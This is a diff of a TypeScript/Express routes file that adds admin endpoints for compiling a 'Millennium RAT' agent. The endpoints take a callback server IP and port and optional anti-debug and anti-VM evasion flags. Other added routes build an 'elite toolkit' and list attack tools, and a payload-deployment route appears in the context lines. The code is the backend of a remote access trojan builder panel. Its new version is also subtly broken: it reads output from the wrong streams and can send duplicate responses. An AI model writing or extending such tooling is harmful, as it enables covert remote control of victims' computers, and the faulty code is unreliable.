@@ -378,6 +378,146 @@ export async function registerRoutes(app: Express): Promise<Server> {
     }
   });
 
+  // Python script execution endpoints
+  app.post("/api/admin/compile-millennium-agent", requireAuth, async (req: any, res) => {
+    try {
+      const { serverIp, serverPort, outputName, crypterOptions } = req.body;
+      const { spawn } = require('child_process');
+      
+      const args = [
+        'python_tools/millennium_rat_toolkit.py',
+        '--compile-agent',
+        '--server-ip', serverIp || '0.0.0.0',
+        '--server-port', serverPort || '8888',
+        '--output', outputName || 'millennium_agent'
+      ];
+
+      if (crypterOptions?.antiDebug) args.push('--anti-debug');
+      if (crypterOptions?.antiVM) args.push('--anti-vm');
+      if (crypterOptions?.compression) args.push('--compression');
+
+      const childProcess = spawn('python3', args, {
+        cwd: process.cwd(),
+        stdio: ['pipe', 'pipe', 'pipe']
+      });
+
+      let output = '';
+      let error = '';
+
+      process.stdout.on('data', (data) => {
+        output += data.toString();
+      });
+
+      process.stderr.on('data', (data) => {
+        error += data.toString();
+      });
+
+      process.on('close', (code) => {
+        if (code === 0) {
+          res.json({ 
+            success: true, 
+            output: output,
+            path: `./output/${outputName}.exe`
+          });
+        } else {
+          res.json({ 
+            success: false, 
+            error: error || 'Compilation failed',
+            output: output
+          });
+        }
+      });
+
+      // Set timeout for long-running processes
+      setTimeout(() => {
+        childProcess.kill();
+        res.json({ success: false, error: 'Process timeout' });
+      }, 60000); // 60 second timeout
+
+    } catch (error) {
+      console.error("Python script execution error:", error);
+      res.status(500).json({ success: false, error: "Failed to execute Python script" });
+    }
+  });
+
+  app.post("/api/admin/build-elite-toolkit", requireAuth, async (req: any, res) => {
+    try {
+      const { outputDir } = req.body;
+      const { spawn } = require('child_process');
+      
+      const toolkitProcess = spawn('python3', ['python_tools/elite_toolkit.py'], {
+        cwd: process.cwd(),
+        stdio: ['pipe', 'pipe', 'pipe']
+      });
+
+      let output = '';
+      let error = '';
+
+      toolkitProcess.stdout.on('data', (data: any) => {
+        output += data.toString();
+      });
+
+      toolkitProcess.stderr.on('data', (data: any) => {
+        error += data.toString();
+      });
+
+      toolkitProcess.on('close', (code: number) => {
+        if (code === 0) {
+          res.json({ 
+            success: true, 
+            output: output,
+            message: 'Elite toolkit built successfully'
+          });
+        } else {
+          res.json({ 
+            success: false, 
+            error: error || 'Build failed',
+            output: output
+          });
+        }
+      });
+
+      setTimeout(() => {
+        toolkitProcess.kill();
+        res.json({ success: false, error: 'Process timeout' });
+      }, 120000); // 2 minute timeout for toolkit build
+
+    } catch (error) {
+      console.error("Elite toolkit build error:", error);
+      res.status(500).json({ success: false, error: "Failed to build elite toolkit" });
+    }
+  });
+
+  app.get("/api/admin/python-tools", requireAuth, async (req, res) => {
+    try {
+      const fs = require('fs');
+      const path = require('path');
+      
+      const toolsDir = path.join(process.cwd(), 'python_tools');
+      const tools = [];
+      
+      if (fs.existsSync(toolsDir)) {
+        const files = fs.readdirSync(toolsDir);
+        for (const file of files) {
+          if (file.endsWith('.py')) {
+            const filePath = path.join(toolsDir, file);
+            const stats = fs.statSync(filePath);
+            tools.push({
+              name: file,
+              path: filePath,
+              size: stats.size,
+              modified: stats.mtime
+            });
+          }
+        }
+      }
+      
+      res.json({ tools });
+    } catch (error) {
+      res.status(500).json({ message: "Failed to list Python tools" });
+    }
+  });
+
   // Cookie consent tracking
   app.post("/api/cookie-consent", async (req: any, res) => {
     try {
@@ -473,66 +613,7 @@ export async function registerRoutes(app: Express): Promise<Server> {
     }
   });
 
-  // Millennium RAT Toolkit Management Routes
-  app.post("/api/admin/compile-millennium-agent", requireAuth, async (req: any, res) => {
-    try {
-      const { serverIp, serverPort, outputName, crypterOptions } = req.body;
-      
-      // Use Python subprocess to compile
-      const { spawn } = require('child_process');
-      
-      const compileCommand = [
-        'python3',
-        'python_tools/millennium_rat_toolkit.py',
-        '--compile-agent',
-        '--server-ip', serverIp || '0.0.0.0',
-        '--server-port', serverPort || '8888',
-        '--output', outputName || 'millennium_agent.exe'
-      ];
 
-      if (crypterOptions?.enabled) {
-        compileCommand.push('--apply-crypter');
-        if (crypterOptions.antiDebug) compileCommand.push('--anti-debug');
-        if (crypterOptions.antiVM) compileCommand.push('--anti-vm');
-        if (crypterOptions.compression) compileCommand.push('--compression');
-      }
-
-      const result = await new Promise((resolve, reject) => {
-        const child = spawn(compileCommand[0], compileCommand.slice(1), {
-          stdio: 'pipe',
-          cwd: process.cwd()
-        });
-
-        let stdout = '';
-        let stderr = '';
-
-        child.stdout.on('data', (data) => {
-          stdout += data.toString();
-        });
-
-        child.stderr.on('data', (data) => {
-          stderr += data.toString();
-        });
-
-        child.on('close', (code) => {
-          if (code === 0) {
-            resolve({ success: true, output: stdout, path: `builds/${outputName}.exe` });
-          } else {
-            reject(new Error(`Compilation failed: ${stderr}`));
-          }
-        });
-
-        child.on('error', (error) => {
-          reject(error);
-        });
-      });
-
-      res.json(result);
-    } catch (error) {
-      console.error("Millennium agent compilation error:", error);
-      res.status(500).json({ message: "Failed to compile Millennium agent", error: error.message });
-    }
-  });
 
   app.post("/api/admin/deploy-payload", requireAuth, async (req: any, res) => {
     try {
